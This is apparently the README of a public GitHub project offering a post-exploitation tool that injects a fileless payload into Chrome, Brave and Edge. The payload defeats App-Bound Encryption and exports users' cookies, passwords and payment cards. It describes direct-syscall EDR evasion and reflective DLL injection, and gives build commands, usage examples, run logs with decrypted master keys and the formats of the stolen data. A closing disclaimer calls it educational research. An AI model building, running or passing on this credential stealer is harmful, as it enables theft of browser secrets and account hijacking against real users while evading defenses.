# Chrome App-Bound Encryption Decryption

## 🚀 Overview

![Build Status](https://img.shields.io/badge/build-passing-brightgreen)
![License](https://img.shields.io/badge/license-MIT-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20x64%20%7C%20ARM64-lightgrey)
![Languages](https://img.shields.io/badge/code-C%2B%2B%20%7C%20ASM-9cf)

A post-exploitation tool demonstrating a complete, in-memory bypass of Chromium's **App-Bound Encryption (ABE)**. This project leverages a fileless, multi-stage injection process utilizing direct syscalls and reflective DLL injection to decrypt and exfiltrate sensitive user data (cookies, passwords, payments) from modern Chromium browsers.

If you find this research valuable, I’d appreciate a coffee:  
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M61EP5XL)

## 🔬 Technical Workflow

The tool operates via a two-stage process, meticulously designed to evade common endpoint defenses and achieve its objectives without requiring administrative privileges or leaving artifacts on disk.

### **Stage 1: The Injector (`chrome_inject.exe`)**

1.  **Initialization:** The injector starts by parsing command-line arguments and dynamically initializing a **direct syscall engine**. It enumerates `ntdll.dll`'s export table, sorts `Zw` functions by address to determine their Syscall Service Numbers (SSNs), and locates `syscall/ret` or `svc/ret` gadgets. This allows all subsequent process interactions to bypass user-land API hooking.
2.  **Payload Preparation:** The core payload DLL is not stored on disk. It is embedded as an encrypted resource within the injector. At runtime, the injector loads this resource, decrypts it in-memory using a **ChaCha20** cipher, and prepares it for injection.
3.  **Targeting & Injection:** It identifies the target browser process. Using the direct syscall engine, it allocates executable memory in the target (`NtAllocateVirtualMemory`), writes the decrypted payload (`NtWriteVirtualMemory`), and initiates execution via **Reflective DLL Injection (RDI)** by creating a new thread pointing to the `ReflectiveLoader` export (`NtCreateThreadEx`).

### **Stage 2: The Injected Payload (In-Memory)**

1.  **Bootstrapping:** Once in the target's memory space, the `ReflectiveLoader` stub acts as a custom PE loader. It properly maps the DLL's sections, resolves its import address table (IAT) by parsing PEB structures and hashing module/function names, and performs base relocations. Finally, it calls the payload's `DllMain`.
2.  **COM Hijack:** The payload, now running with the browser's own identity, connects back to the injector via a named pipe for C2. It then instantiates the browser's internal `IElevator` COM server. Because the call originates from a legitimate, path-validated process, the COM server's security checks are satisfied.
3.  **Master Key Decryption:** The payload invokes the `DecryptData` method on the COM interface, passing it the `app_bound_encrypted_key` from the `Local State` file. The COM server successfully decrypts it, returning the plaintext AES-256 master key to our payload.
4.  **Data Exfiltration:** With the master key, the payload discovers all user profiles, accesses the relevant SQLite databases (`Cookies`, `Login Data`, `Web Data`), and uses the key to decrypt sensitive data blobs with **AES-256-GCM**. The decrypted secrets are formatted as JSON and streamed back to the injector, which writes them to the output directory.

## 🛡️ Core Technical Pillars

This tool is built on several advanced, security-focused techniques:

*   **Direct Syscalls for Evasion:** Bypasses EDR/AV user-land hooks on standard WinAPI functions (`OpenProcess`, `WriteProcessMemory`, etc.) by invoking kernel functions directly. The engine is robust, supporting both x64 and ARM64 by finding syscall gadgets dynamically at runtime.

*   **Fileless In-Memory Payload:** The payload DLL never touches the disk on the target machine. It is stored encrypted in the injector, decrypted in-memory, and reflectively loaded, significantly reducing its signature and forensic footprint.

*   **Reflective DLL Injection (RDI):** A stealthy process injection method that avoids using `LoadLibrary`, thereby evading common detection mechanisms that monitor module loads. The loader is self-contained and resolves all dependencies from memory.

*   **Target-Context COM Invocation:** The critical step for defeating App-Bound Encryption. By executing code *within* the trusted browser process, we inherit its identity, allowing us to make legitimate-appearing calls to the ABE COM server and bypass its path-validation security checks.

## ⚙️ Features

#### Core Functionality
- 🔓 Full user-mode decryption of cookies, passwords, and payment methods.
- 📁 Discovers and processes all user profiles (Default, Profile 1, etc.).
- 📝 Exports all extracted data into structured JSON files, organized by profile.

#### Stealth & Evasion
- 🛡️ **Fileless Payload Delivery:** In-memory decryption and injection of an encrypted resource.
- 🛡️ **Direct Syscall Engine:** Bypasses common endpoint defenses by avoiding hooked user-land APIs.
- 🤫 **Reflective DLL Injection:** Stealthily loads the payload without suspicious `LoadLibrary` calls.
- 👻 **No Admin Privileges Required:** Operates entirely within the user's security context.

#### Compatibility & Usability
- 🌐 Works on **Google Chrome**, **Brave**, & **Edge**.
- 💻 Natively supports **x64** and **ARM64** architectures.
- 🚀 Can auto-launch a headless browser process if one isn't running.
- 📁 Customizable output directory for extracted data.

<img width="1734" height="1552" alt="image" src="https://github.com/user-attachments/assets/3261aa3e-5875-4dcd-8a6f-dff93ec8aa25" />


## 📚 In-Depth Technical Analysis & Research

For a comprehensive understanding of Chrome's App-Bound Encryption, the intricacies of its implementation, the detailed mechanics of this tool's approach, and a broader discussion of related security vectors, please refer to my detailed research paper:

1.  ➡️ **[Chrome App-Bound Encryption (ABE) - Technical Deep Dive & Research Notes](docs/RESEARCH.md)**

    This document covers:
    * The evolution from DPAPI to ABE.
    * A step-by-step breakdown of the ABE mechanism, including `IElevator` COM interactions and key wrapping.
    * Detailed methodology of the DLL injection strategy used by this tool.
    * Analysis of encrypted data structures and relevant Chromium source code insights.
    * Discussion of alternative decryption vectors and Chrome's evolving defenses.

2.  ➡️ **[The Curious Case of the Cantankerous COM: Decrypting Microsoft Edge's App-Bound Encryption](docs/The_Curious_Case_of_the_Cantankerous_COM_Decrypting_Microsoft_Edge_ABE.md)**

    This article details the specific challenges and reverse engineering journey undertaken to achieve reliable ABE decryption for Microsoft Edge. It includes:
    *   An account of the initial issues and misleading error codes (`E_INVALIDARG`, `E_NOINTERFACE`).
    *   The process of using COM type library introspection (with Python `comtypes`) to uncover Edge's unique `IElevatorEdge` vtable structure and inheritance.
    *   How this insight led to tailored C++ interface stubs for successful interaction with Edge's ABE service.
    *   A practical look at debugging tricky COM interoperability issues.

3.  ➡️ **[COMrade ABE: Your Field Manual for App-Bound Encryption's COM Underbelly](docs/COMrade_ABE_Field_Manual.md)**

    This field manual introduces **COMrade ABE**, a Python-based dynamic analyzer for ABE COM interfaces, and dives into its practical applications:
    *   Explains the necessity for dynamic COM interface analysis due to browser variations and updates.
    *   Details COMrade ABE's methodology: registry scanning for service discovery, Type Library loading and parsing, and heuristic-based ABE method signature matching.
    *   Provides a comprehensive guide to interpreting COMrade ABE's output, including CLSIDs, IIDs (standard and C++ style), and the significance of verbose output details like VTable offsets, defining interfaces, and full inheritance chains.
    *   Highlights the utility of the auto-generated C++ stubs (`--output-cpp-stub`) for rapid development and research.
    *   Discusses how COMrade ABE aids in adapting to ABE changes, analyzing new Chromium browsers, and understanding vendor-specific COM customizations.

## 📦 Supported & Tested Versions

| Browser            | Tested Version (x64 & ARM64) |
| ------------------ | ---------------------------- |
| **Google Chrome**  | 138.0.7204.97                |
| **Brave**          | 1.80.115 (138.0.7204.97)     |
| **Microsoft Edge** | 139.0.3405.13                |

> [!NOTE]  
> The injector requires the target browser to be **running** unless you use `--start-browser`.

## 🔧 Build Instructions

This project uses a simple, robust build script that handles all compilation and resource embedding automatically.

1. **Clone** this repository.

2. Open a **Developer Command Prompt for VS** (or any MSVC‑enabled shell).

3. Run the build script from the project root:

   ```bash
    PS> make.bat
    --------------------------------------------------
    |          Chrome Injector Build Script          |
    --------------------------------------------------

    [INFO] Verifying build environment...
    [ OK ] Developer environment detected.
    [INFO] Target Architecture: x64

    [INFO] Performing pre-build setup...
    [INFO]   - Creating fresh build directory: build
    [ OK ] Setup complete.

    -- [1/6] Compiling SQLite3 Library ------------------------------------------------
    [INFO]   - Compiling C object file...
    cl /nologo /W3 /O2 /MT /GS- /c libs\sqlite\sqlite3.c /Fo"build\sqlite3.obj"
    sqlite3.c
    [INFO]   - Creating static library...
    lib /NOLOGO /OUT:"build\sqlite3.lib" "build\sqlite3.obj"
    [ OK ] SQLite3 library built successfully.

    -- [2/6] Compiling Payload DLL (chrome_decrypt.dll) ------------------------------------------------
    [INFO]   - Compiling C file (reflective_loader.c)...
    cl /nologo /W3 /O2 /MT /GS- /c src\reflective_loader.c /Fo"build\reflective_loader.obj"
    reflective_loader.c
    [INFO]   - Compiling C++ file (chrome_decrypt.cpp)...
    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 /Ilibs\sqlite /c src\chrome_decrypt.cpp /Fo"build\chrome_decrypt.obj"
    chrome_decrypt.cpp
    [INFO]   - Linking objects into DLL...
    link /NOLOGO /DLL /OUT:"build\chrome_decrypt.dll" "build\chrome_decrypt.obj" "build\reflective_loader.obj" "build\sqlite3.lib" bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /IMPLIB:"build\chrome_decrypt.lib"
      Creating library build\chrome_decrypt.lib and object build\chrome_decrypt.exp
    [ OK ] Payload DLL compiled successfully.

    -- [3/6] Compiling Encryption Utility (encryptor.exe) ------------------------------------------------
    [INFO]   - Compiling and linking...
    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 /Ilibs\chacha src\encryptor.cpp /Fo"build\encryptor.obj" /link /NOLOGO /DYNAMICBASE /NXCOMPAT /OUT:"build\encryptor.exe"
    encryptor.cpp
    [ OK ] Encryptor utility compiled successfully.

    -- [4/6] Encrypting Payload DLL ------------------------------------------------
    [INFO]   - Running encryption process...
    build\encryptor.exe build\chrome_decrypt.dll build\chrome_decrypt.enc
    Successfully ChaCha20-encrypted build\chrome_decrypt.dll to build\chrome_decrypt.enc
    [ OK ] Payload encrypted to chrome_decrypt.enc.

    -- [5/6] Compiling Resource File ------------------------------------------------
    [INFO]   - Compiling .rc to .res...
    rc.exe /i "build" /fo "build\resource.res" src\resource.rc
    Microsoft (R) Windows (R) Resource Compiler Version 10.0.10011.16384
    Copyright (C) Microsoft Corporation.  All rights reserved.

    [ OK ] Resource file compiled successfully.

    -- [6/6] Compiling Final Injector (chrome_inject.exe) ------------------------------------------------
    [INFO]   - Assembling syscall trampoline (x64)...
    ml64.exe /c /Fo"build\syscall_trampoline_x64.obj" "src\syscall_trampoline_x64.asm"
    Microsoft (R) Macro Assembler (x64) Version 14.44.35211.0
    Copyright (C) Microsoft Corporation.  All rights reserved.

    Assembling: src\syscall_trampoline_x64.asm
    [INFO]   - Compiling C++ source files...
    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 /Ilibs\chacha /c src\chrome_inject.cpp src\syscalls.cpp /Fo"build\\"
    chrome_inject.cpp
    syscalls.cpp
    Generating Code...
    [INFO]   - Linking final executable...
    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 "build\chrome_inject.obj" "build\syscalls.obj" build\syscall_trampoline_x64.obj "build\resource.res" version.lib shell32.lib /link /NOLOGO /DYNAMICBASE /NXCOMPAT /OUT:".\chrome_inject.exe"
    [ OK ] Final injector built successfully.

    --------------------------------------------------
    |                 BUILD SUCCESSFUL               |
    --------------------------------------------------

      Final Executable: .\chrome_inject.exe

    [INFO] Build successful. Final artifacts are ready.
   ```

This single command will compile all components and produce a self-contained `chrome_inject.exe` in the root directory.

###  Automated Builds with GitHub Actions

This project uses GitHub Actions to automatically build the injector executable ( `chrome_inject.exe`) for both **x64** and **ARM64** architectures

You can find the latest pre-compiled binaries on the [**Releases page**](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases). The executables for both architectures are packaged together in a single, convenient .zip file.

**Release Package Contents:**
- `chrome_inject_x64.exe`
- `chrome_inject_arm64.exe`

## 🚀 Usage

```bash
Usage: chrome_inject.exe [options] <chrome|brave|edge>
```

### Options

Options

- `--start-browser` or `-s`
  Auto-launch the browser if it’s not already running.

- `--output-path <path>` or `-o <path>`
  Specifies the base directory for output files.
  Defaults to `.\output\` relative to the injector's location.
  Data will be organized into subfolders: `<path>/<BrowserName>/<ProfileName>/`.

- `--verbose` or `-v`
  Enable extensive debugging output from the injector.

- `--help` or `-h`
  Show this help message.

### Examples

```bash
# Standard injection into a running Chrome process:
PS> .\chrome_inject.exe chrome

# Auto-start Brave and show verbose debug logs:
PS> .\chrome_inject.exe --start-browser --verbose brave
```

#### Normal Run

```bash
PS> .\chrome_inject.exe --start-browser brave
------------------------------------------------
|  Chrome App-Bound Encryption Decryption      |
|  Direct Syscall Injection Engine             |
|  x64 & ARM64 | Cookies, Passwords, Payments  |
|  v0.13.0 by @xaitax                          |
------------------------------------------------

[*] Brave not running, launching...
[+] Brave (v. 138.1.80.120) launched w/ PID 26048
[*] Waiting for DLL (Pipe: \\.\pipe\efd06328-a141-4922-b8dc-881bc08e946c)

[*] Decryption process started for Brave
[+] COM library initialized (APARTMENTTHREADED).
[+] Reading Local State file: C:\Users\ah\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State
[+] Decrypted AES Key: 5f5b1c8112fba445332a9b01a59349f1112426753bfee2c5908aab6c46982fcd
[*] Processing profile: Default
     [*] 1406 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Brave\Default\cookies.txt
     [*] 1019 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Brave\Default\passwords.txt
     [*] 1 payments extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Brave\Default\payments.txt
[*] Decryption process finished.

[+] DLL signaled completion or pipe interaction ended.
[*] Brave terminated by injector.
```

#### Verbose

```bash
PS> .\chrome_inject.exe --verbose --start-browser chrome
------------------------------------------------
|  Chrome App-Bound Encryption Decryption      |
|  Direct Syscall Injection Engine             |
|  x64 & ARM64 | Cookies, Passwords, Payments  |
|  v0.13.0 by @xaitax                          |
------------------------------------------------

[#] [Syscalls] Found and sorted 489 Zw* functions.
[#] [Syscalls] Successfully initialized all direct syscall stubs.
[#] [Syscalls]   - NtAllocateVirtualMemory (SSN: 24) -> Gadget: 0x7ffacdfd1190
[#] Named pipe server created: \\.\pipe\9ec94252-33c6-4c39-b32b-8234e9c9f957
[#] Snapshotting processes for chrome.exe
[*] Chrome not running, launching...
[#] Waiting 3s for browser to initialize...
[+] Chrome (v. 138.0.7204.100) launched w/ PID 25984
[#] Architecture match: Injector=ARM64, Target=ARM64
[#] Loading payload DLL from embedded resource.
[#] Successfully loaded embedded resource 'PAYLOAD_DLL'. Size: 1366016 bytes.
[#] Decrypting payload in-memory with ChaCha20...
[#] Payload decrypted.
[#] Calling NtAllocateVirtualMemory_syscall...
[#] NtAllocateVirtualMemory_syscall returned 0x0
[#] Calling NtWriteVirtualMemory_syscall...
[#] NtWriteVirtualMemory_syscall returned 0x0
[#] Calling RDI::Inject()...
[#] RDI: ReflectiveLoader file offset: 0x13bc8
[#] RDI: Memory allocated in target at 0x22b9d310000
[#] RDI: Payload written to target memory. Bytes written: 1366016
[#] RDI: Memory permissions changed from 0x64 to PAGE_EXECUTE_READ (0x32).
[#] RDI: Calculated remote ReflectiveLoader address: 0x22b9d323bc8
[#] RDI: Waiting for remote ReflectiveLoader thread...
[#] RDI::Inject returned true
[#] Reflective DLL Injection succeeded.
[#] Waiting for DLL to connect to named pipe...
[#] DLL connected to named pipe.
[#] Sent message to pipe: VERBOSE_TRUE
[#] Sent message to pipe: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output
[*] Waiting for DLL (Pipe: \\.\pipe\9ec94252-33c6-4c39-b32b-8234e9c9f957)

[*] Decryption process started for Chrome
[+] COM library initialized (APARTMENTTHREADED).
[+] Reading Local State file: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
[+] Decrypted AES Key: 3fa14dc988a34c85bdb872159b739634cb7e56f8e34449c1494297b9b629d094
[*] Processing profile: Default
     [*] 371 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\cookies.txt
     [*] 1 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\passwords.txt
[*] Processing profile: Profile 1
     [*] 27 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.txt
     [*] 1 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\passwords.txt
[*] Decryption process finished.
[#] DLL completion signal received.

[+] DLL signaled completion or pipe interaction ended.
[#] Terminating browser PID=25984 because injector started it.
[*] Chrome terminated by injector.
[#] Injector finished.
[#] Freed remote pipe name memory.
```

## 📂 Data Extraction

Once decryption completes, data is saved to the specified output path (defaulting to `.\output\` if not specified via `--output-path`). Files are organized as follows:

**Base Path:** `YOUR_CHOSEN_PATH` (e.g., `.\output\` or the path you provide)
**Structure:** <Base Path>/<BrowserName>/<ProfileName>/<data_type>.txt

Example paths (assuming default output location):**

- 🍪 **Cookies (Chrome Default profile):** .\output\Chrome\Default\cookies.txt
- 🔑 **Passwords (Edge Profile 1):** .\output\Edge\Profile 1\passwords.txt
- 💳 **Payment Methods (Brave Default profile):** .\output\Brave\Default\payments.txt

### 🍪 Cookie Extraction

Each cookie file is a JSON array of objects:

```json
[
  {
    "host": "accounts.google.com",
    "name": "ACCOUNT_CHOOSER",
    "value": "AFx_qI781-…"
  },
  {
    "host": "mail.google.com",
    "name": "OSID",
    "value": "g.a000uwj5ufIS…"
  },
  …
]
```

### 🔑 Password Extraction

Each password file is a JSON array of objects:

```json
[
  {
    "origin": "https://example.com/login",
    "username": "user@example.com",
    "password": "••••••••••"
  },
  {
    "origin": "https://another.example.com",
    "username": "another_user",
    "password": "••••••••••"
  }
  …
]
```

### 💳 Payment Method Extraction

Each payment file is a JSON array of objects:

```json
[
  {
    "name_on_card": "John Doe",
    "expiration_month": 12,
    "expiration_year": 2030,
    "card_number": "••••••••••1234",
    "cvc": "•••"
  },
  {
    "name_on_card": "Jane Smith",
    "expiration_month": 07,
    "expiration_year": 2028,
    "card_number": "••••••••••5678",
    "cvc": "•••"
  }
  …
]
```

## 🔗 Additional Resources & Research

This project builds upon the work and analysis of the wider security community.

- **Official Documentation & Announcements:**
  - [Google Security Blog: Improving the security of Chrome cookies on Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
  - [Design Doc: Chrome app-bound encryption Service](https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view)

- **Community Research & Acknowledgment:**
  - Proof of concept by [SilentDev33](https://github.com/SilentDev33/ChromeAppBound-key-injection)

## 🗒️ Changelog

All notable changes to this project are documented in the [**CHANGELOG**](CHANGELOG.md) file. This includes version history, new features, bug fixes, and security improvements.

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 💡 Project Philosophy & Disclaimer

> [!IMPORTANT]
> This is a hobby project created for educational and security research purposes. It serves as a personal learning experience and a playing field for exploring advanced Windows concepts.
>
> **This tool is NOT intended to be a fully-featured infostealer or a guaranteed EDR evasion tool.** While it employs advanced techniques, its primary goal is to demonstrate and dissect the ABE mechanism, not to provide operational stealth for malicious use. Please ensure compliance with all relevant legal and ethical guidelines.
